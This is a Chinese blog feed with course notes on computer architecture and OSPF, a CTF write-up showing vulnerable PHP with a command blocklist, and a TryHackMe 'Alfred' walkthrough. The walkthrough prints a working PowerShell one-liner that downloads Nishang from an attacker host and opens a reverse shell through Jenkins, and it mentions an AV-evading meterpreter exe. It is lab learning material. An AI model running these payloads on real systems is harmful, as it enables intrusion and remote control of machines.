一般是周期<br>t&#x3D;hTa+(1-h)Tm<br>3. ***效率</p><p>n&#x3D;tc&#x2F;t</p><h2 id="三种映射方式"><a href="#三种映射方式" class="headerlink" title="三种映射方式"></a>三种映射方式</h2><h4 id="直接映射"><a href="#直接映射" class="headerlink" title="直接映射"></a>直接映射</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240611161121.png" alt="image.png"></p><h4 id="全相联映射"><a href="#全相联映射" class="headerlink" title="全相联映射"></a>全相联映射</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240611161206.png" alt="image.png"></p><h4 id="组相联映射"><a href="#组相联映射" class="headerlink" title="组相联映射"></a>组相联映射</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240611161222.png" alt="image.png"></p><h2 id="替换算法"><a href="#替换算法" class="headerlink" title="替换算法"></a>替换算法</h2><blockquote><p>其实就是 你cache 不命中 是不是就要到内存中 去找数据<br>因此就在这里我们就需要设计算法 去替换cache </p></blockquote><h5 id="最不经常使用LFU："><a href="#最不经常使用LFU：" class="headerlink" title="最不经常使用LFU："></a>最不经常使用LFU：</h5><p>将一段时间内被访问次数最少的存储行换出  每一行一个计数器  被访问加一</p><h5 id="近期最少使用LRU："><a href="#近期最少使用LRU：" class="headerlink" title="近期最少使用LRU："></a>近期最少使用LRU：</h5><p>选择近期内长久未访问的块进行替换 每一行一个计数器  被访问 清零其他加一</p><h5 id="随机替换"><a href="#随机替换" class="headerlink" title="随机替换"></a>随机替换</h5><h5 id="先进先出FIFO：选择最早调入的块进行替换"><a href="#先进先出FIFO：选择最早调入的块进行替换" class="headerlink" title="先进先出FIFO：选择最早调入的块进行替换"></a>先进先出FIFO：选择最早调入的块进行替换</h5><h3 id="保证一致性"><a href="#保证一致性" class="headerlink" title="保证一致性"></a>保证一致性</h3><p>**写回法：修改时不立即写回主存，只有当此块被换出时才写回主存<br>全写法：当CPU对Cache写命中时，必须把数据同时写入Cache和主存（需要写缓冲）</p><h2 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h2><blockquote><p>首先简单介绍一下虚拟存储器 , 一般来讲 程序 需要的 主存的大小可能远大于或者小于 主存<br>因此对于存储器来讲 ,我们会有一个虚拟空间 我们可以根据虚拟空间 编写虚拟地址<br>存在辅存中, 程序运行时候可以看到虚拟地址会有地址转换 </p></blockquote><h4 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h4><blockquote><p>可以看到 页表 其实就是用来进行地址转换的 页表里面 分页面<br>页面分为 逻辑页面和 物理页面 一般来讲  分为高字段 字号和低字段的 页内地址<br>因此可以看到就是一个转换</p></blockquote><blockquote><p>***一般一个进程一个页表 因此可能会很大 所以<br>、</p></blockquote><p>**相关存储方式</p><ol><li>主存和辅存都保留 </li><li>反向页表</li><li>二级页表类似目录一般</li></ol><h5 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h5><blockquote><p>*转换后援缓冲器  快表 一般是用来 类似于 cache 的作用 一般就是<br>将一些经常访问的东西都  存在快表增加时间</p></blockquote><h4 id="转换步骤"><a href="#转换步骤" class="headerlink" title="转换步骤"></a>转换步骤</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240613161336.png" alt="image.png"></p><p>***页表基地址 寄存器 </p><p>**逻辑页号作为数组的下表可以得到物理页号因此 可以指将 物理页号与一个页内地址拼接找到物理地址</p><h4 id="替换算法-1"><a href="#替换算法-1" class="headerlink" title="替换算法"></a>替换算法</h4><blockquote><p>和cache一样</p></blockquote><h4 id="cache和-虚拟存储器"><a href="#cache和-虚拟存储器" class="headerlink" title="cache和 虚拟存储器"></a>cache和 虚拟存储器</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240613162046.png" alt="image.png"></p><h3 id="主存编址"><a href="#主存编址" class="headerlink" title="主存编址"></a>主存编址</h3><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/2d8750e27c91702fc6f6415f6c34936b.jpg" alt="2d8750e27c91702fc6f6415f6c34936b.jpg"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/e9ad2a976c03ba68c0c079abc1eb9b81.jpg" alt="e9ad2a976c03ba68c0c079abc1eb9b81.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-OSPF</title>
      <link href="/2024/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-OSPF/"/>
      <url>/2024/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-OSPF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240621094053.png" alt="image.png"></p><p>接下来，就要隆重介绍下动态路由协议中的当红炸子鸡—OSPF（Open Shortest Path First，开放最短路径优先）啦！</p><p>与RIP不同，OSPF是一种链路状态路由协议，它可以收集路由器周边的拓扑变化，并形成一个靠谱的路由结构。</p><p>如果说RIP提供的是路标，只告诉你下一步该怎么走，转来转去还是容易迷路（产生环路）。那么OSPF提供的就是地图了，每个运行OSPF协议的路由器上都有一张完整的网络图。地图在手，迷路不再有！</p><p><img src="https://s5.51cto.com/oss/202306/08/16815cf6837acd84362952587b26eee46e1edd.png" alt="图片" title="图片"></p><p><img src="https://s9.51cto.com/oss/202306/08/87ead7368926618e6ac504a790b270df278561.png" alt="图片" title="图片"></p><p>OSPF的花费（cost）可以是路由距离、链路的吞吐量或链路的可靠性，这种路由度量相比于RIP协议的跳数更加灵活和准确，并且适用于更大更复杂的网络。</p><p>以下图所示的网络为例，说明OSPF计算出路由的过程。</p><p>下图是由四台路由器组成的网络，连线旁边标注了从一台路由器到另一台路由器所需要的花费（cost）。为简化问题，我们假定同一链路连接的两台路由器之间互相发送报文所需花费是相同的。</p><p><img src="https://s6.51cto.com/oss/202306/08/27516de29a444d587f08468e92f56c1cf67ec5.png" alt="图片" title="图片"></p><p>首先，每台路由器都根据自己周围的网络拓扑结构生成一条LSA（链路状态广播），并通过相互之间发送OSPF协议报文将这条LSA发送给网络中其他所有的路由器。这样每台路由器都收到了其他路由器的LSA。将所有的LSA放在一起称作LSDB（链路状态数据库）。显然，这四台路由器的LSDB都是相同的。</p><p><img src="https://s4.51cto.com/oss/202306/08/693e705484297247b4f3024e80822f1ed7bad9.png" alt="图片" title="图片"></p><p>其次，由于一条LSA是对一台路由器周围网络拓扑结构的描述，那么LSDB则是对整个网络拓扑结构的描述。路由器将LSDB转换成一张矢量权重图，这张图便是对整个网络拓扑结构的真实反映。那么，这四台路由器得到的是一张完全相同的图。</p><p><img src="https://s4.51cto.com/oss/202306/08/d5405a1616b3678a9d271088678a49315aae22.png" alt="图片" title="图片"></p><p>最后也是最重要的是，每台路由器都会以自己为根节点，使用最短路径优先（SPF）算法计算出一颗最短路径树（选择cost值最小的那条路径），通过最短路径树生成到网络中其他路由器的最短路由，形成路由表。这4台路由器各自得到的路由表是不同的。</p><p><img src="https://s5.51cto.com/oss/202306/08/173af4056cfe2106aa8484f620824a9ead3d6c.png" alt="图片" title="图片"></p><p>从上面的分析可以得出，OSPF协议计算出路由主要有以下3个主要步骤。</p><ol><li>描述本路由器周边的网络拓扑结构，并生成LSA。</li><li>将自己生成的LSA在自治系统里传播，并同时收集所有的其他路由器生成的LSA。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理_运算器</title>
      <link href="/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E8%BF%90%E7%AE%97%E5%99%A8/"/>
      <url>/2024/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E8%BF%90%E7%AE%97%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607214208.png"></p><h2 id="数据表示和运算"><a href="#数据表示和运算" class="headerlink" title="数据表示和运算"></a>数据表示和运算</h2><h4 id="溢出判断"><a href="#溢出判断" class="headerlink" title="溢出判断"></a>溢出判断</h4><h5 id="双符号"><a href="#双符号" class="headerlink" title="双符号"></a>双符号</h5><blockquote><p>符号位上两个   之后两个运算 之后可以看见 运算结果 </p></blockquote><ol><li>01 正溢</li><li>10 负溢</li></ol><h5 id="单符号"><a href="#单符号" class="headerlink" title="单符号"></a>单符号</h5><blockquote><p>符号位上一个 但是 要看符号位的 后一位 为有效位</p></blockquote><p>符号位置有进位为 1   有效位置有进位 1 </p><ol><li>01 正溢</li><li>10 负溢</li></ol><h4 id="浮点数IEEE754表示"><a href="#浮点数IEEE754表示" class="headerlink" title="浮点数IEEE754表示"></a>浮点数IEEE754表示</h4><table><thead><tr><th>S</th><th>阶码八位</th><th>M</th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><h5 id="浮点数-到十进制"><a href="#浮点数-到十进制" class="headerlink" title="浮点数 到十进制"></a>浮点数 到十进制</h5><p>阶码八位 -127  得到十进制的数字  为e</p><blockquote><p> (-1)的s次方 *  1.M   * 2的e次方 &#x3D;二进制数字</p></blockquote><h5 id="十进制到浮点数"><a href="#十进制到浮点数" class="headerlink" title="十进制到浮点数"></a>十进制到浮点数</h5><blockquote><p>首先转 二进制<br>移动小数点使得其在  第一位和第二位之间  移动了多少位置 为e</p></blockquote><blockquote><p>*e转二进制 之后加上127 得到阶码   八位这时候也可以看到 s为 0还是1 </p></blockquote><p>之后就可以得到一个 IEEE754的 二进制数字   转个十六进制</p><h3 id="运算电路"><a href="#运算电路" class="headerlink" title="运算电路"></a>运算电路</h3><h4 id="一位全加器"><a href="#一位全加器" class="headerlink" title="一位全加器"></a>一位全加器</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/c8b42806a1cb6fc021fe5f5202b4c5d.jpg" alt="c8b42806a1cb6fc021fe5f5202b4c5d.jpg"></p><blockquote><p>可以看到很容易理解 直接就是 二进制加法<br>每次执行一个位置 计算 进位和输出</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/4dc91cecad5b3b2a923e0569436991c.jpg" alt="4dc91cecad5b3b2a923e0569436991c.jpg"></p><h5 id="一位全加器-1"><a href="#一位全加器-1" class="headerlink" title="一位全加器"></a>一位全加器</h5><blockquote><p>直接就是s&#x3D;a异或b异或c<br>ci&#x3D;(a异或b)与c+a与b</p></blockquote><h5 id="行波进位加法器"><a href="#行波进位加法器" class="headerlink" title="行波进位加法器"></a>行波进位加法器</h5><blockquote><p> 主要是加一个控制 M 在运算时先有一个M和 b异或的举动   之后才是正常的输入两个数字<br> 姑且称b’   则开始就是 b’异或 a<br> 最后一步加上了一个 溢出判断   最后两个进位进行一个异或</p></blockquote><h4 id="延迟时间判断"><a href="#延迟时间判断" class="headerlink" title="延迟时间判断"></a>延迟时间判断</h4><blockquote><p>异或一次3T    与1T     或1T</p></blockquote><h5 id="一位加法器"><a href="#一位加法器" class="headerlink" title="一位加法器"></a>一位加法器</h5><blockquote><p>首先可以看到  异或需要3T 结束之后 需要3T异或 因此需要6T</p></blockquote><h5 id="行波进位加法器-1"><a href="#行波进位加法器-1" class="headerlink" title="行波进位加法器"></a>行波进位加法器</h5><blockquote><p>溢出判断和开始的运算模式判断无法更改  必须有6T 之后进入 加法器里面 可以看到<br>首先必须有一个3T 并且是并发同时完成的 之后需要 ci 逐个传递 ci出现还要再一个2T<br>因此 总体时间*** TN&#x3D;9T+2T* n </p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>目前个人水平来看 目前就是<br>定点数 和浮点数 在运算器中分两大类别<br>之后可以看到 分别由加减乘除 的运算步骤和电路的设计    包括电路延迟时间和 溢出判断<br>不过复习是有重点的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录</title>
      <link href="/2024/05/25/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/05/25/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><blockquote><p>初见 两个参数 cmd 和img<br>cmd 无论传递什么参数都没用 但是img仿佛还是有用的 可以将图片内容进行一个base64编码之后再传回到页面里面 涉及到一个data:标签</p></blockquote><table><thead><tr><th>php data schema url</th><th><a href="data%20%E6%95%B0%E6%8D%AE%E5%B5%8C%E5%85%A5.md">data 数据嵌入</a></th></tr></thead><tbody><tr><td>本题目 img 参数 是请求这个文件内容 然后将文件内容返回到这个data后面的数据 里面</td><td></td></tr><tr><td>跟文件包含不一样  因此直接请求index.php读取源码</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixio= no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>其实事情已经很简单了 直接一个post传递参数 的 a b 强比较 直接绕过<br>同时注意黑名单的过滤 应该是如何的黑名单 的过滤</p></blockquote><table><thead><tr><th>rce绕过</th><th>[[rce.md#Rce执行命令函数#]]</th></tr></thead><tbody><tr><td>php弱比较</td><td>[[php弱比较#php强比较#]]</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thm-alfred</title>
      <link href="/2024/05/14/thm-alfred/"/>
      <url>/2024/05/14/thm-alfred/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514215259.png" alt="image.png"></p><table><thead><tr><th>机器信息</th><th>Alfred 阿尔佛雷德</th><th></th><th></th></tr></thead><tbody><tr><td>状态</td><td>未知</td><td></td><td></td></tr><tr><td>系统</td><td>windows</td><td></td><td></td></tr><tr><td>详细信息</td><td>jenkens 的一个未授权访问的 漏洞 打点同时通道建立 windows nishang框架和msf 联动 直接getshell  使用windows个人token伪造提权</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="循例信息收集"><a href="#循例信息收集" class="headerlink" title="循例信息收集"></a>循例信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">简单信息收集查看开放端口</span></span><br><span class="line">Scanned at 2024-05-06 13:41:27 BST for 19s</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">Reason: 997 no-responses</span><br><span class="line">PORT     STATE SERVICE       REASON</span><br><span class="line">80/tcp   open  http          syn-ack ttl 128</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 128</span><br><span class="line">8080/tcp open  http-proxy    syn-ack ttl 128</span><br><span class="line">MAC Address: 02:63:3A:F8:06:C9 (Unknown)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="详细扫描"><a href="#详细扫描" class="headerlink" title="详细扫描"></a>详细扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Host is up (0.00030s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE    VERSION</span><br><span class="line">80/tcp   filtered http</span><br><span class="line">3389/tcp open     tcpwrapped</span><br><span class="line">| ssl-cert: Subject: commonName=alfred</span><br><span class="line">| Not valid before: 2024-05-06T09:05:43</span><br><span class="line">|_Not valid after:  2024-11-05T09:05:43</span><br><span class="line">8080/tcp filtered http-proxy</span><br><span class="line">MAC Address: 02:25:99:23:A0:73 (Unknown)</span><br><span class="line"></span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line"></span><br><span class="line">Device type: specialized|WAP|phone</span><br><span class="line"></span><br><span class="line">Running: iPXE 1.X, Linux 2.4.X|2.6.X, Sony Ericsson embedded</span><br><span class="line">OS CPE: cpe:/o:ipxe:ipxe:1.0.0%2b cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz</span><br><span class="line">OS details: iPXE 1.0.0+, Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.30 ms ip-10-10-140-74.eu-west-1.compute.internal (10.10.140.74)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最大的感受-端口太少了-……"><a href="#最大的感受-端口太少了-……" class="headerlink" title="最大的感受 端口太少了 ……"></a>最大的感受 端口太少了 ……</h3><blockquote><p>看来又是磨web的一天  </p></blockquote><h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><blockquote><p>纯扯淡 啥也没有</p></blockquote><h4 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h4><blockquote><p>jenkins   一个持续集成的工具</p></blockquote><table><thead><tr><th>jenkins</th><th><a href="Jenkins%20%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%B7%A5%E5%85%B7.md">Jenkins 持续集成工具</a></th><th></th></tr></thead><tbody><tr><td></td><td><a href="Jenkins%E5%8A%9F%E8%83%BD%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md#%E5%BC%B1%E5%8F%A3%E4%BB%A4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0">弱口令 未授权进入后台</a></td><td></td></tr><tr><td>这是一个远程代码执行漏洞</td><td></td><td></td></tr></tbody></table><h3 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get_shell"></a>Get_shell</h3><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240511202227.png" alt="image.png"><br>这个地方可以配置命令 可以直接执行</p><table><thead><tr><th>windows打点</th><th><a href="windows%E6%89%93%E7%82%B9%E9%80%9A%E9%81%93.md">windows打点通道</a></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 感觉这个可以通用 这个 命令 </span></span><br><span class="line"><span class="comment"># 基本调用了powershell中的命令 </span></span><br><span class="line"><span class="comment"># 基本上 可以 通杀了 </span></span><br><span class="line"><span class="comment"># 先下载之后再进行一个 执行反向连接  </span></span><br><span class="line"></span><br><span class="line">powershell <span class="built_in">iex</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://your-ip:your-port/ Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> your<span class="literal">-ip</span> <span class="literal">-Port</span> your<span class="literal">-port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这段PowerShell命令执行的是一个反向TCP PowerShell脚本。让我逐步解释一下：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. `powershell <span class="built_in">iex</span>`: 这部分调用了PowerShell解释器，并使用`iex`（`Invoke<span class="literal">-Expression</span>`）命令来执行后续的脚本或命令。</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>. `(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#x27;</span>)`: 这部分使用`Net.WebClient`对象创建一个Web客户端，并调用`DownloadString`方法从指定的URL下载一个PowerShell脚本（`Invoke<span class="literal">-PowerShellTcp</span>.ps1`）。在这里，你需要替换`your<span class="literal">-ip</span>`和`your<span class="literal">-port</span>`为实际的IP地址和端口号。</span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>. `Invoke<span class="literal">-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> your<span class="literal">-ip</span> <span class="literal">-Port</span> your<span class="literal">-port</span>`: 这部分调用了`Invoke<span class="literal">-PowerShellTcp</span>.ps1`脚本，并传递了参数`-Reverse`、`-IPAddress`和`-Port`。`-Reverse`参数表示在反向连接模式下运行，即连接到指定的IP地址和端口。`-IPAddress`和`-Port`参数分别指定了用于反向连接的目标IP地址和端口号，这也需要替换为实际的IP地址和端口号。</span><br></pre></td></tr></table></figure><h4 id="http服务"><a href="#http服务" class="headerlink" title="http服务"></a>http服务</h4><blockquote><p>先进入nishang的shells里面<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240511202458.png" alt="image.png"></p></blockquote><h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">iex</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://10.11.69.232:80/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">10.11</span>.<span class="number">69.232</span> <span class="literal">-Port</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure><blockquote><p>直接反向shell 连接回来</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240511203021.png" alt="image.png"><br>不知道为啥卡的要死 要转半天<br>保存配置之后需要进行一个 build now </p><p>成功getshell<br>太丝滑了 丝滑的我不敢相信这是我的网络状态<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240511211507.png" alt="image.png"></p><h3 id="稳定的meterpreter"><a href="#稳定的meterpreter" class="headerlink" title="稳定的meterpreter"></a>稳定的meterpreter</h3><p>先生成一个免杀 exe 文件之后通过http服务下载<br>之后执行反弹shell</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514160431.png" alt="image.png"><br>看到这个之后可以看到一个很酷的东西 